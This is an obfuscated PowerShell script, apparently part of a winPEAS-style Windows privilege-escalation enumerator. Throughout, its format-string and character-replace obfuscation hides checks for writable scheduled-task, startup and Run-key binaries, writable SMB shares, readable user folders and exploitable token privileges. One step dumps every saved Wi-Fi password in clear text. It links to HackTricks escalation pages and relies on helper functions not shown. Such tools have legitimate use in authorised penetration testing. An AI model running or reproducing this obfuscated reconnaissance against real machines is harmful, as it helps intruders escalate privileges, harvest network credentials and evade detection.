&("{2}{0}{1}" -f'Ho','st','Write-') -ForegroundColor ("{1}{0}"-f 'ue','Bl') ((("{14}{6}{13}{8}{1}{12}{0}{11}{15}{3}{7}{4}{10}{2}{5}{9}{16}" -f'acces','est','Xms','mwi','d','ys','====','n','PJd T','tem329X','ows9','s to c','ing ','====PJd','=',':9X','mtasks'))  -REpLAce ([ChAr]57+[ChAr]88+[ChAr]109),[ChAr]92 -CrePLacE([ChAr]80+[ChAr]74+[ChAr]100),[ChAr]124)
if (&("{1}{2}{0}{3}" -f 'ildIte','Get-','Ch','m') ((("{1}{6}{4}{0}{3}{5}{2}"-f'windows8wTsystem328wT','c','sks','t','T','a',':8w')).repLacE('8wT','\')) -ErrorAction ("{1}{2}{4}{0}{3}"-f'yCo','Sile','nt','ntinue','l')) {
  &("{0}{1}{2}"-f 'W','rite','-Host') ("{6}{2}{5}{7}{0}{3}{4}{1}" -f'd ','ion','ess conf','futhe','r investigat','irmed,','Acc',' may nee')
  &("{0}{1}{2}" -f'Get','-Ch','ildItem') ((("{0}{3}{5}{1}{4}{2}" -f'c:{','ws{0}system32{0}ta','s','0}','sk','windo')) -F [chAR]92)
}
else {
  &("{1}{2}{0}"-f't','Wri','te-Hos') ("{0}{1}{4}{11}{8}{9}{6}{7}{12}{2}{10}{5}{3}"-f 'N','o admi','a','folder.','n acces','s ','uled',' ','h','ed','sk','s to sc','t')
  &("{5}{2}{4}{0}{3}{1}" -f 'heduledTa','k','et','s','-Sc','G') | &("{0}{1}{2}"-f 'Whe','re-Objec','t') { ${_}.TaskPath -notlike ((("{3}{1}{2}{0}{4}" -f'croso','0}M','i','{','ft*'))-f  [CHaR]92) } | &("{0}{3}{2}{4}{1}" -f 'Fo','ct','h-Obj','rEac','e') {
    ${Ac`TI`ONs} = ${_}.Actions.Execute
    if (${actIo`Ns} -ne ${n`Ull}) {
      foreach (${a} in ${ACTi`o`NS}) {
        if (${A} -like ("{0}{1}{3}{2}"-f '%wi','ndi','%*','r')) { ${A} = ${a}.replace(("{2}{0}{1}"-f 'win','dir%','%'), ${Env:w`in`diR}) }
        elseif (${a} -like ("{1}{0}{2}"-f'ystemRoot','%S','%*')) { ${a} = ${A}.replace(("{0}{1}{2}" -f '%Syste','m','Root%'), ${ENV:`W`IN`DiR}) }
        elseif (${A} -like ("{1}{2}{0}{3}"-f'ppdata','%loc','ala','%*')) { ${A} = ${A}.replace(("{3}{0}{2}{1}"-f'cal','pdata%','ap','%lo'), "$env:UserProfile\appdata\local") }
        elseif (${A} -like ("{0}{1}{2}"-f'%ap','p','data%*')) { ${A} = ${a}.replace(("{1}{2}{0}{3}"-f 'al','%l','oc','appdata%'), ${ENv:`Ap`pdata}) }
        ${A} = ${A}.Replace('"', '')
        &("{1}{0}{2}{3}" -f't-A','Star','CLC','heck') -Target ${A}
        &("{1}{0}{2}"-f 'rit','W','e-Host') "`n"
        &("{1}{2}{0}" -f 'Host','Writ','e-') "TaskName: $($_.TaskName) "
        &("{1}{0}{2}"-f 'ri','W','te-Host') ("{3}{4}{1}{0}{2}" -f'-','---','-','----','----')
        [pscustomobject]@{
          LastResult = $((${_} | &("{0}{3}{1}{2}{4}"-f 'Get-S','l','edTa','chedu','skInfo')).LastTaskResult)
          NextRun    = $((${_} | &("{0}{4}{1}{3}{2}"-f'Get-S','hedul','askInfo','edT','c')).NextRunTime)
          Status     = ${_}.State
          Command    = ${_}.Actions.execute
          Arguments  = ${_}.Actions.Arguments 
        } | &("{0}{1}{2}"-f'Write','-Ho','st')
      } 
    }
  }
}



&("{2}{0}{1}"-f'rite-Hos','t','W') ""
if (${ti`M`eST`AMP}) { &("{1}{3}{2}{0}" -f 'ed','T','meElaps','i') }
&("{2}{0}{3}{1}" -f'rit','ost','W','e-H') -ForegroundColor ("{0}{1}"-f'Blu','e') ((("{4}{2}{9}{1}{0}{5}{8}{3}{7}{6}" -f '=dIN','==','==','I','===','dIN STARTUP ','Vulnerable Check','CATIONS ','APPL','='))  -rEplACe ([ChAR]100+[ChAR]73+[ChAR]78),[ChAR]124)
("{11}{15}{18}{16}{12}{26}{22}{10}{6}{24}{27}{23}{31}{33}{9}{1}{2}{0}{5}{29}{7}{25}{28}{19}{17}{3}{30}{4}{32}{8}{13}{21}{20}{14}" -f'y ','d',' b','p','son','a',' ','min or ',' a not fo','o be execute','hat','Check if','fy ','und','y',' you c','n modi','im','a','can ','ar',' bin','y binary t','i','is g','if you','an','o',' ','d','er','ng','ate',' t')
&("{0}{1}{2}"-f 'W','rite-H','ost') ("{0}{14}{24}{7}{20}{8}{13}{4}{15}{9}{26}{5}{21}{6}{2}{18}{3}{23}{22}{17}{11}{12}{25}{19}{10}{1}{16}"-f 'h','t-sta','ning/win','ws-lo','trick','n','s-harde',':/','book.','.xyz','un-a','a','latio','hack','tt','s','rtup','esc','do','#r','/','dow','rivilege-','cal-p','ps','n','/wi') -ForegroundColor ("{0}{1}"-f'Ye','llow')

@(((("{0}{3}{18}{13}{12}{9}{5}{10}{11}{17}{15}{6}{2}{4}{8}{1}{14}{16}{19}{7}" -f 'C','ams{0}S','0}Pro',':{','g','ng','}Start Menu{','p','r','d Setti','s','{0}All ','an','ocuments ','ta','rs{0','r','Use','0}D','tu'))-F  [cHAR]92),
  (('C:'+'{0}Docume'+'n'+'ts ')-F [ChaR]92+'an'+'d '+"Settings\$env:Username\Start "+('Menu3N'+'fProgr'+'ams'+'3NfSt'+'a'+'rtup').REpLacE(([ChAR]51+[ChAR]78+[ChAR]102),'\')), 
  ("$env:ProgramData\Microsoft\Windows\Start "+('Men'+'uo'+'4w'+'P'+'rograms'+'o4wSta'+'rtup').replACE(([CHAr]111+[CHAr]52+[CHAr]119),'\')), 
  ("$env:Appdata\Microsoft\Windows\Start "+('M'+'enu'+'{'+'0}Pro'+'grams{0}Startu'+'p') -f[char]92)) | &("{2}{0}{1}{3}"-f 'or','Ea','F','ch-Object') {
  if (&("{2}{1}{3}{0}"-f 'h','est-','T','Pat') ${_}) {
    
    &("{0}{2}{1}{4}{3}"-f 'S','ACLChe','tart-','k','c') ${_}
    &("{1}{2}{0}"-f 'em','Get','-ChildIt') -Recurse -Force -Path ${_} | &("{0}{3}{2}{1}"-f'Fo','h-Object','ac','rE') {
      ${SUB`i`TEM} = ${_}.FullName
      if (&("{1}{2}{0}"-f 'th','Test-P','a') ${s`UBIT`eM}) { 
        &("{0}{1}{2}{3}" -f'Start-A','CLCh','ec','k') -Target ${SU`B`ItEM}
      }
    }
  }
}
&("{0}{2}{3}{1}" -f 'Wr','Host','it','e-') ""
if (${tImE`StA`Mp}) { &("{2}{1}{0}" -f 'sed','meElap','Ti') }
&("{2}{1}{0}" -f 't','s','Write-Ho') -ForegroundColor ("{1}{0}"-f 'e','Blu') ((("{2}{10}{6}{4}{7}{8}{9}{1}{0}{5}{11}{3}"-f'st','APPS Regi','=','k','==2XJ2XJ','ry C','=====',' START','UP',' ','=','hec'))-rePLace ([cHar]50+[cHar]88+[cHar]74),[cHar]124)

@(((("{0}{4}{18}{12}{17}{10}{15}{1}{19}{16}{11}{8}{7}{2}{13}{9}{6}{5}{3}{14}"-f 'r','w','o','ersionrgj','e','rentV','ur','r','Mic','ftrgjWindowsrgjC','g','gj','try::','so','Run','jSoft','r','HKLMr','gis','are'))  -REplACe  'rgj',[cHAr]92),
  ((("{9}{3}{13}{5}{11}{15}{14}{2}{10}{0}{4}{6}{12}{8}{1}{16}{7}"-f'AWin','ntVersionoPAR','Microsof','st','d','::HKLMoP','o','ce','soPACurre','regi','toP','ASof','w','ry','PA','twareo','unOn')) -rEPlacE'oPA',[CHaR]92),
  ((("{0}{8}{3}{5}{4}{11}{10}{7}{2}{12}{9}{15}{1}{14}{13}{6}" -f'registry::HKCU','r','qt','oftw','r','areqtGMic','n','s','qtGS','rentV','oftqtGWindow','os','GCur','onqtGRu','si','e')).REpLAcE('qtG','\')),
  ((("{4}{1}{14}{5}{13}{3}{10}{0}{9}{12}{2}{11}{8}{6}{7}" -f 'M','gis','ft','wa','re','::HKCU','ndows9H1CurrentVersion9','H1RunOnce','1Wi','icros','re9H1','9H','o','9H1Soft','try')).rePlaCe('9H1',[STriNG][cHAR]92))) | &("{0}{3}{1}{2}"-f'Fo','Obj','ect','rEach-') {
  
  ${rOPa`TH} = ${_}
  (&("{2}{0}{1}" -f 'e','m','Get-It') ${_}) | &("{0}{2}{4}{3}{1}"-f 'ForEa','t','ch','bjec','-O') {
    ${ropRo`peR`Ty} = ${_}.property
    ${rOP`Ro`per`Ty} | &("{3}{1}{0}{4}{2}" -f'c','orEa','t','F','h-Objec') {
      &("{1}{0}{2}{4}{3}" -f'rt-','Sta','ACL','eck','Ch') ((&("{1}{3}{2}{4}{0}" -f 'y','Get-Ite','ro','mP','pert') -Path ${rop`ATh}).${_} -split ((("{1}{3}{0}{2}" -f 'exeQ','(?<=Q','bWb)','bW.')).RepLAce(([cHAR]81+[cHAR]98+[cHAR]87),[sTring][cHAR]92)))[0].Trim('"')
    }
  }
}





&("{2}{0}{1}"-f 'te-Hos','t','Wri') ""
if (${timEST`A`Mp}) { &("{2}{1}{0}{3}"-f'ap','eEl','Tim','sed') }
&("{2}{1}{0}" -f'Host','ite-','Wr') -ForegroundColor ("{0}{1}"-f 'Blu','e') ((("{1}{0}{6}{3}{2}{5}{4}"-f '========mW','=','NSTALLED A','D I','S','PPLICATION','DmW'))-rEPLACe  ([ChAr]109+[ChAr]87+[ChAr]68),[ChAr]124)
&("{0}{2}{1}" -f'W','-Host','rite') ("{2}{6}{4}{7}{1}{5}{0}{3}"-f'd applica','t of','Generatin','tions',' li',' installe','g','s')

&("{2}{1}{0}" -f'e','et-CimInstanc','G') -class ("{1}{0}{2}{3}" -f'32_Prod','win','u','ct') | &("{0}{3}{1}{2}" -f 'Sele','b','ject','ct-O') ("{0}{1}"-f 'Na','me'), ("{0}{1}"-f'Ve','rsion') | 
&("{0}{4}{1}{3}{2}"-f 'ForEac','Ob','ct','je','h-') {
  &("{2}{1}{3}{0}"-f'ost','e-','Writ','H') $("{0} : {1}" -f ${_}.Name, ${_}.Version)  
}


&("{0}{2}{1}"-f 'W','te-Host','ri') ""
if (${Time`S`TamP}) { &("{0}{2}{3}{1}" -f'Tim','apsed','eE','l') }
&("{1}{0}{2}"-f 'H','Write-','ost') -ForegroundColor ("{0}{1}"-f 'Blu','e') ((("{3}{9}{5}{10}{7}{2}{4}{8}{0}{1}{6}" -f'R B','ASH.','O','====','OKING F','==1m','EXE','1mf L','O','===','f'))-replacE  '1mf',[chAR]124)
&("{0}{1}{3}{2}"-f'Get-','Ch','tem','ildI') (("{0}{4}{5}{2}{1}{3}" -f 'C','xSj','yWinS','Py',':jPyWind','owsjP')).replACE(([CHar]106+[CHar]80+[CHar]121),'\') -Filter ("{9}{4}{7}{8}{5}{3}{0}{6}{1}{2}" -f'l','s','-bash*','dows-','md64_mi','in','xs','cros','oft-w','a') | &("{0}{2}{3}{1}" -f 'Fo','bject','rEach','-O') {
  &("{2}{1}{3}{0}" -f 'Host','e','Writ','-') $((&("{1}{2}{0}" -f 'ldItem','Get','-Chi') ${_}.FullName -Recurse -Filter ("{2}{0}{1}"-f'ash.ex','e*','*b')).FullName)
}
@(("{1}{0}" -f '.exe','bash'), ("{2}{1}{0}"-f 'xe','sl.e','w')) | &("{3}{0}{2}{1}"-f'or','bject','Each-O','F') { &("{1}{2}{0}"-f 'Host','Wri','te-') $((&("{4}{2}{0}{3}{1}"-f 'Ch','ldItem','-','i','Get') ((("{2}{0}{4}{1}{5}{3}{6}"-f'ows','S','C:{0}Wind','em3','{0}','yst','2{0}')) -F  [chaR]92) -Filter ${_}).FullName) }


&("{1}{2}{0}" -f 'Host','W','rite-') ""
if (${ti`M`EsT`AmP}) { &("{1}{3}{0}{2}"-f'laps','Ti','ed','meE') }
&("{1}{0}{2}"-f'ite-Hos','Wr','t') -ForegroundColor ("{0}{1}"-f'B','lue') ((("{1}{6}{3}{4}{2}{0}{5}" -f 'G FOR SCCM ','=','=6Gt6Gt LOOKIN','==','===','CLIENT','=='))  -CRepLACE'6Gt',[CHar]124)
${R`ESUlt} = &("{2}{0}{3}{1}"-f'et-','ect','G','WmiObj') -Namespace ((("{3}{1}{4}{0}{5}{2}"-f'm{','oot','ntSDK','r','{0}cc','0}clie')) -F[ChaR]92) -Class ("{3}{0}{1}{2}"-f'CM_','A','pplication','C') -Property ('*') -ErrorAction ("{1}{4}{0}{3}{2}"-f'tlyC','Si','inue','ont','len') | &("{2}{4}{1}{3}{0}" -f'bject','lect-','S','O','e') ("{1}{0}" -f 'e','Nam'), ("{3}{0}{4}{1}{2}"-f 'o','reVers','ion','S','ftwa')
if (${R`eS`UlT}) { ${RE`sUlt} }
elseif (&("{1}{2}{0}" -f 't-Path','Te','s') ((("{1}{3}{5}{2}{6}{7}{0}{4}"-f'nt.','C:4','4I','IAW','exe','indows','ACCM4IASCC','lie')) -RePLace  ([ChAR]52+[ChAR]73+[ChAR]65),[ChAR]92)) { &("{0}{2}{1}"-f 'Writ','Host','e-') ((("{4}{13}{10}{15}{6}{2}{16}{0}{14}{1}{3}{7}{12}{5}{9}{8}{11}"-f'C:{','indows{0','o','}C','SC','}','lient f','CM{','nt.','SCClie','M','exe','0','C','0}W',' C','und at '))-f[Char]92) -ForegroundColor ("{0}{1}"-f'C','yan') }
else { &("{1}{0}{2}"-f 'os','Write-H','t') ("{3}{2}{0}{1}"-f'all','ed.','t Inst','No') }



&("{0}{2}{1}" -f 'Wr','ost','ite-H') ""
if (${t`iMEst`AMp}) { &("{2}{1}{0}" -f'sed','eElap','Tim') }
&("{1}{2}{0}" -f 'ost','W','rite-H') -ForegroundColor ("{0}{1}" -f'Blu','e') ((("{3}{6}{1}{4}{0}{2}{5}" -f'K INFORM','g61g6','A','====','1 NETWOR','TION','=====')).repLace(([CHAr]103+[CHAr]54+[CHAr]49),'|'))

&("{1}{0}{2}" -f 'o','Write-H','st') ""
if (${TI`m`EstamP}) { &("{3}{2}{1}{0}" -f 'sed','eElap','m','Ti') }
&("{2}{1}{0}{3}"-f's','rite-Ho','W','t') -ForegroundColor ("{0}{1}" -f'Bl','ue') ((("{0}{1}{4}{2}{3}"-f '========','=3SD3SD',' ','FILE',' HOSTS')).rEplACe('3SD','|'))

&("{1}{3}{0}{2}" -f 'Ho','W','st','rite-') ((("{0}{2}{5}{3}{1}{7}{6}{4}"-f'Get conte','h','nt of e','}',' file','tc{0','sts','o')) -f [cHAr]92)
&("{2}{0}{3}{1}"-f'et','tent','G','-Con') ((("{4}{3}{6}{0}{5}{2}{7}{8}{9}{1}" -f 's{0}system','s','{0}d','{0}wind','c:','32','ow','ri','vers{0}etc{0}hos','t'))  -f  [CHAr]92)

&("{3}{2}{1}{0}" -f 't','s','e-Ho','Writ') ""
if (${t`imeSTa`mP}) { &("{0}{1}{2}" -f 'Ti','me','Elapsed') }
&("{1}{0}{2}"-f'ite-Ho','Wr','st') -ForegroundColor ("{0}{1}"-f'Bl','ue') ((("{6}{4}{3}{1}{7}{2}{0}{8}{5}"-f 'MA','A6zA6z IP','R','===','=','ON','=====',' INFO','TI'))  -CReplaCe([cHAR]65+[cHAR]54+[cHAR]122),[cHAR]124)


&("{1}{2}{0}"-f 'Host','Wr','ite-') ""
if (${TIm`ES`TAmP}) { &("{1}{2}{0}{3}"-f's','Time','Elap','ed') }
&("{0}{1}{2}{3}" -f'Writ','e','-H','ost') -ForegroundColor ("{0}{1}"-f 'B','lue') ((("{7}{1}{2}{0}{6}{3}{5}{4}" -f'3','===','g','I','ig ALL','pconf','ig3i ','======')).rEPLACe(([ChAR]103+[ChAR]51+[ChAR]105),'|'))
&("{2}{1}{0}"-f's','s','Start-Proce') ("{1}{0}{2}{3}"-f'onfig','ipc','.','exe') -ArgumentList ("{1}{0}" -f 'all','/') -Wait -NoNewWindow


&("{2}{1}{0}" -f'st','ite-Ho','Wr') ""
if (${tI`M`EsTAmp}) { &("{0}{1}{2}"-f'TimeEla','ps','ed') }
&("{0}{1}{2}" -f 'Write-Ho','s','t') -ForegroundColor ("{0}{1}"-f 'Bl','ue') ((("{0}{2}{4}{3}{1}{5}" -f'=======',' Cac','==LJqLJq','NS',' D','he')).RePlAce(([ChaR]76+[ChaR]74+[ChaR]113),[StrINg][ChaR]124))
&("{2}{0}{1}"-f'fi','g','ipcon') ("{2}{3}{0}{1}"-f'a','ydns','/','displ') | &("{0}{2}{3}{1}" -f'Se','ring','lec','t-St') ("{0}{1}" -f'Re','cord') | &("{1}{0}{2}{3}" -f'r','Fo','Each-Ob','ject') { &("{2}{0}{1}"-f 'ite-Hos','t','Wr') $('{0}' -f ${_}) }
 
&("{2}{1}{0}" -f'ite-Host','r','W') ""
if (${tIM`ES`TA`mp}) { &("{1}{0}{2}"-f 'imeEla','T','psed') }
&("{1}{0}{2}" -f'H','Write-','ost') -ForegroundColor ("{1}{0}" -f 'e','Blu') ((("{2}{4}{0}{1}{5}{3}{6}"-f'===','==={0}{0}','==','G','=',' LISTENIN',' PORTS')) -f [ChAR]124)


&("{0}{3}{1}{2}" -f 'S','art','-Process','t') ("{0}{1}{2}" -f'NE','TSTAT','.EXE') -ArgumentList ("{0}{1}"-f '-a','no') -Wait -NoNewWindow


&("{0}{2}{3}{1}"-f 'Wri','ost','t','e-H') ""
if (${tiME`s`TAmP}) { &("{0}{2}{1}" -f 'T','Elapsed','ime') }
&("{1}{0}{2}"-f'te-Ho','Wri','st') -ForegroundColor ("{1}{0}" -f'e','Blu') ((("{0}{3}{4}{5}{2}{1}"-f'=','Table','RP ','========{0}{0}',' ','A'))  -F [ChaR]124)


&("{1}{0}{2}{3}" -f 'e','Start-Proc','s','s') ("{0}{1}" -f 'a','rp') -ArgumentList "-A" -Wait -NoNewWindow

&("{0}{2}{1}"-f'W','st','rite-Ho') ""
if (${TIM`es`TAMP}) { &("{1}{3}{0}{2}"-f 'pse','TimeE','d','la') }
&("{0}{1}{2}"-f 'Wr','ite','-Host') -ForegroundColor ("{0}{1}"-f 'Bl','ue') ((("{5}{2}{3}{1}{4}{0}"-f 'es','N3uN','=======3','u',' Rout','=='))-REPLAcE '3uN',[chAr]124)


&("{3}{2}{0}{1}"-f 'oces','s','-Pr','Start') ("{0}{1}"-f 'rou','te') -ArgumentList ("{0}{1}" -f'p','rint') -Wait -NoNewWindow

&("{2}{1}{0}"-f'te-Host','ri','W') ""
if (${t`i`meS`TAmP}) { &("{0}{2}{1}" -f 'TimeE','ed','laps') }
&("{0}{1}{2}"-f'Wri','te','-Host') -ForegroundColor ("{1}{0}" -f'lue','B') ((("{6}{0}{3}{1}{2}{8}{7}{9}{4}{10}{5}" -f'======h','V','hfV N','f','i','o','===','k Adapt','etwor','er ','nf')).RePLAcE(([cHAR]104+[cHAR]102+[cHAR]86),[sTRiNg][cHAR]124))


&("{2}{3}{0}{1}{4}" -f 'apt','e','G','et-NetAd','r') | &("{1}{3}{0}{2}" -f 'bje','F','ct','orEach-O') { 
  &("{1}{0}{2}"-f 'e-H','Writ','ost') ("{2}{1}{0}" -f'------','--','--')
  &("{1}{2}{3}{0}" -f 'Host','W','rit','e-') ${_}.Name
  &("{1}{0}{2}"-f 'te','Wri','-Host') ${_}.InterfaceDescription
  &("{2}{0}{1}" -f'ite','-Host','Wr') ${_}.ifIndex
  &("{2}{1}{0}"-f't','s','Write-Ho') ${_}.Status
  &("{2}{0}{1}" -f'te-Hos','t','Wri') ${_}.MacAddress
  &("{1}{2}{0}"-f 'e-Host','Wri','t') ("{0}{2}{1}" -f'---','-----','--')
} 


&("{0}{1}{2}" -f'Wr','ite-','Host') ""
if (${t`ime`StaMp}) { &("{2}{1}{0}" -f'lapsed','eE','Tim') }
&("{2}{1}{0}{3}" -f 'H','-','Write','ost') -ForegroundColor ("{0}{1}" -f 'Bl','ue') ((("{13}{3}{5}{4}{6}{10}{2}{1}{12}{7}{9}{8}{11}{0}" -f's','g','ckin','=','0}{','====={','0','F','pass','i ','} Che','word',' for Wi','===')) -F  [cHAR]124)


((&("{2}{1}{0}"-f 'sh.exe','et','n') ("{1}{0}" -f 'n','wla') ("{1}{0}"-f 'how','s') ("{2}{1}{0}"-f 'iles','of','pr')) -match '\s{2,}:\s').replace(("{2}{0}{4}{1}{3}"-f ' All ','ser Profil','   ','e     : ','U'), "") | &("{2}{3}{1}{0}"-f 'ect','h-Obj','ForEa','c') {
  &("{0}{1}"-f 'n','etsh') ("{1}{0}"-f 'lan','w') ("{1}{0}"-f 'how','s') ("{0}{1}"-f'pr','ofile') ((("{0}{1}"-f 'nam','e={0}_')) -f  [chAR]36) ("{1}{2}{0}" -f'ear','key','=cl') 
}


&("{0}{2}{1}" -f'W','st','rite-Ho') ""
if (${tiME`Sta`MP}) { &("{0}{2}{1}" -f 'TimeE','psed','la') }
&("{1}{0}{2}{3}"-f'ri','W','te-','Host') -ForegroundColor ("{1}{0}" -f'lue','B') ((("{13}{5}{20}{2}{1}{11}{16}{7}{15}{6}{9}{18}{3}{0}{10}{8}{4}{19}{14}{12}{17}"-f 'mand ','e','L Enabl',' com','- i','===','dis','-',' ','play','only','d f','sp','===','erwrite the di',' ','irewall rules ','lay buffer','ing','t can ov','===PiLPi')).rePLAce('PiL',[STRiNg][CHAR]124))
&("{0}{2}{1}{3}" -f'W','e-H','rit','ost') -ForegroundColor ("{0}{1}" -f'B','lue') ((("{11}{7}{19}{13}{1}{16}{8}{4}{17}{18}{20}{10}{25}{14}{23}{2}{6}{0}{9}{22}{15}{12}{21}{24}{5}{3}" -f 'a','sh','vfir','all',' al','in name=','ewall firew','=====','w','ll s','with: n','==','e ',' ','tsh a','ul','o','l',' rule','=={0}{0}','s ','dir','how r','d','=','e'))-f[chaR]124)


&("{0}{2}{1}"-f'Write-','ost','H') ""
if (${Ti`mesT`A`Mp}) { &("{3}{0}{1}{2}"-f 'meEl','ap','sed','Ti') }
&("{2}{1}{0}" -f 'Host','ite-','Wr') -ForegroundColor ("{0}{1}" -f'Bl','ue') ((("{5}{0}{2}{1}{4}{3}" -f '=','dsjds SMB S','======j','ES','HAR','==')).replACE(([CHar]106+[CHar]100+[CHar]115),[sTrInG][CHar]124))
&("{1}{0}{2}" -f'-Ho','Write','st') ("{7}{14}{11}{2}{10}{4}{5}{9}{0}{13}{3}{12}{15}{8}{6}{1}" -f ' and ','lable','e','s ','e',' S','i','W',' ava','MB Shares','rat','ll enum','if any ','Acces','i','are') 

&("{3}{0}{1}{2}" -f 't-SmbSha','r','e','Ge') | &("{2}{3}{4}{0}{1}" -f 'cces','s','Get','-','SmbShareA') | &("{4}{3}{2}{1}{0}" -f't','c','e','h-Obj','ForEac') {
  ${smbs`hA`R`eOBJe`ct} = ${_}
  &("{1}{0}{2}" -f'i.e','whoam','xe') ("{1}{0}"-f'oups','/gr') ("{0}{1}" -f'/','fo') ("{0}{1}" -f 'cs','v') | &("{0}{1}{2}{3}"-f'ConvertF','r','om-Cs','v') | &("{2}{0}{1}"-f'lect-Objec','t','Se') -ExpandProperty ("{1}{2}{0}{3}"-f 'a','grou','p n','me') | &("{3}{0}{2}{1}" -f 'orEach-Obj','ct','e','F') {
    if (${Sm`BShAreo`BJ`ecT}.AccountName -like ${_} -and (${SMB`S`Hareob`JecT}.AccessRight -like ("{1}{0}" -f'l','Ful') -or ("{1}{0}"-f 'nge','Cha')) -and ${S`mbS`H`AREo`BjecT}.AccessControlType -like ("{0}{1}" -f'A','llow') ) {
      &("{1}{2}{0}{3}"-f 'te','W','ri','-Host') -ForegroundColor ("{0}{1}" -f'r','ed') "$($SMBShareObject.AccountName) has $($SMBShareObject.AccessRight) to $($SMBShareObject.Name) "
    }
  }
}



&("{2}{0}{1}" -f 'rit','e-Host','W') ""
if (${tIMe`S`TAMP}) { &("{0}{2}{1}{3}" -f 'Time','se','Elap','d') }
&("{1}{2}{0}" -f '-Host','Wri','te') -ForegroundColor ("{1}{0}"-f 'lue','B') ((("{5}{6}{0}{1}{2}{3}{7}{4}"-f '===0c','g','0cg ','U','INFO','=====','=','SER ')).rEplacE('0cg','|'))
&("{0}{2}{3}{1}" -f 'Wri','ost','te','-H') ((("{11}{14}{16}{8}{9}{5}{13}{7}{0}{1}{10}{2}{15}{3}{12}{4}{6}"-f'se','rs a','k','s','if any ex','of all Admin','ist)','rators, U','L','ist ','nd Bac','== A8zA8z G',' (','ist','ene','up Operator','rating ')).rePlacE(([cHAr]65+[cHAr]56+[cHAr]122),'|'))

@(("{3}{1}{0}{2}" -f 'OR','STRAT','S','ADMINI'), ("{1}{0}" -f 'ERS','US')) | &("{3}{2}{1}{0}" -f 'ect','j','Each-Ob','For') {
  &("{2}{1}{0}"-f 'ite-Host','r','W') ${_}
  &("{1}{2}{0}{3}" -f'os','Writ','e-H','t') ("{1}{0}{2}"-f '---','--','--')
  &("{3}{2}{1}{4}{0}" -f 'ess','-P','rt','Sta','roc') ("{0}{1}"-f'ne','t') -ArgumentList ('loca'+'l'+'g'+'roup '+"$_") -Wait -NoNewWindow
}
&("{1}{2}{0}" -f'ost','Wri','te-H') ("{0}{4}{2}{3}{1}" -f 'BACK','S','R','ATOR','UP OPE')
&("{1}{2}{0}"-f'ite-Host','W','r') ("{0}{1}"-f '---','----')
&("{0}{1}{2}"-f'Star','t','-Process') ("{1}{0}" -f 't','ne') -ArgumentList ((("{5}{6}{4}{0}{3}{1}{2}"-f ' ','rs','aOV','Operato','p','localgroup ','aOVBacku')).REpLAcE('aOV',[strIng][ChAr]34)) -Wait -NoNewWindow


&("{2}{1}{0}" -f 'st','rite-Ho','W') ""
if (${tI`ME`STAmp}) { &("{0}{1}{2}" -f'TimeEl','aps','ed') }
&("{2}{1}{0}"-f 't','ite-Hos','Wr') -ForegroundColor ("{1}{0}"-f'lue','B') ((("{2}{0}{3}{5}{6}{8}{7}{1}{4}" -f '======={',' ACCESS CHEC','==','0}','K','{0} USE','R DI','Y','RECTOR')) -f  [CHAr]124)
&("{4}{1}{2}{0}{3}" -f 'Ite','-','Child','m','Get') ((("{1}{0}{2}{3}" -f ':{0}','C','U','sers{0}*'))-F[CHar]92) | &("{2}{0}{3}{1}" -f'E','h-Object','For','ac') {
  if (&("{1}{2}{0}"-f 'em','G','et-ChildIt') ${_}.FullName -ErrorAction ("{4}{2}{1}{0}{3}" -f 'ont','yC','entl','inue','Sil')) {
    &("{2}{0}{1}" -f 'ite-Ho','st','Wr') -ForegroundColor ("{0}{1}"-f're','d') "Read Access to $($_.FullName) "
  }
}


&("{0}{3}{2}{1}" -f 'Wr','Host','te-','i') ""
if (${tIme`ST`AmP}) { &("{2}{0}{1}" -f 'a','psed','TimeEl') }
&("{3}{1}{2}{0}"-f '-Host','r','ite','W') -ForegroundColor ("{1}{0}" -f 'lue','B') ((("{1}{0}{3}{4}{2}" -f '====','=====','I INFO','YiOY','iO WHOAM')).RePLACE(([chAR]89+[chAR]105+[chAR]79),[StRINg][chAR]124))
&("{1}{2}{3}{0}" -f 'ost','Write','-','H') ""
if (${T`imESt`AMP}) { &("{0}{1}{2}"-f'TimeEl','apse','d') }
&("{1}{2}{0}" -f 'ost','Write','-H') -ForegroundColor ("{0}{1}" -f'B','lue') ((("{15}{23}{24}{2}{20}{19}{17}{14}{13}{6}{1}{5}{4}{8}{22}{21}{16}{11}{9}{0}{12}{7}{18}{3}{10}"-f'ge-esca','i','ck Token acces','using','-local','ndows','hardening/w','on','-pr','ation/privile','-tokens','e-escal','lati','indows-','ook.hacktricks.xyz/w','=========','eg','://b','-ab',' https','s here:','l','ivi','{0}','{0} Che')) -f  [cHar]124) -ForegroundColor ("{0}{1}" -f 'ye','llow')
&("{1}{0}{2}" -f '-','Write','Host') -ForegroundColor ("{1}{0}"-f'ue','Bl') ((("{63}{73}{4}{62}{13}{27}{19}{15}{28}{17}{43}{64}{41}{35}{50}{29}{75}{52}{80}{8}{9}{1}{58}{37}{16}{78}{2}{69}{32}{65}{72}{39}{3}{20}{7}{21}{77}{47}{23}{55}{51}{45}{40}{31}{70}{14}{34}{18}{57}{12}{42}{22}{71}{6}{44}{0}{33}{49}{66}{54}{79}{59}{67}{10}{74}{24}{68}{60}{25}{38}{48}{53}{61}{5}{56}{11}{36}{46}{76}{30}{26}"-f'eateTo','en t','a',' SeImp','ck i','TakeO',', ','rsona','e','d any tok','v','ership','ile',' ','r','t',' use t','tors ','lege, SeBacku','de the Adminis','e','tePrivile','eRestore','n','iv','e','ilege','you are insi','ra',' you','ge, SeDebbugPriv','lege, SeTc','te pri','k','ivi',' ','Privi','an be','ge','e','rivi','or','ge, S','g','SeCr','aryP','l','ig',',','en','if','m','a',' S','rivilege, ','Pri','wn','pPriv','hat c','LoadD','l','e','f','=========P','roup ','vileg','P','ri','i','la','bP','Privilege','es lik','EIPEI Che','erPr',' have en','e','ge, SeAss','o esc','Se','bl')).REPLACe('PEI',[StriNg][CHAr]124))
&("{0}{3}{2}{1}" -f 'Write-','t','s','Ho') ("{0}{1}{9}{17}{18}{6}{14}{24}{12}{13}{15}{10}{11}{3}{23}{16}{2}{19}{8}{4}{21}{22}{7}{20}{25}{5}" -f 'https:/','/book.hack','s-local-privi','win','i','s','s.xyz','u','ege-escalat','t','den','ing/','ws','-ha','/wind','r','w','ri','ck','l','sers-and-gro','o','n#','do','o','up') -ForegroundColor ("{1}{0}"-f 'w','Yello')
&("{2}{1}{3}{0}"-f'ess','art-','St','Proc') ("{1}{0}{2}{3}" -f 'o','wh','a','mi.exe') -ArgumentList ("{0}{1}"-f'/al','l') -Wait -NoNewWindow


&("{1}{0}{2}" -f'H','Write-','ost') ""
if (${TI`me`STAmp}) { &("{1}{0}{2}"-f'Ela','Time','psed') }
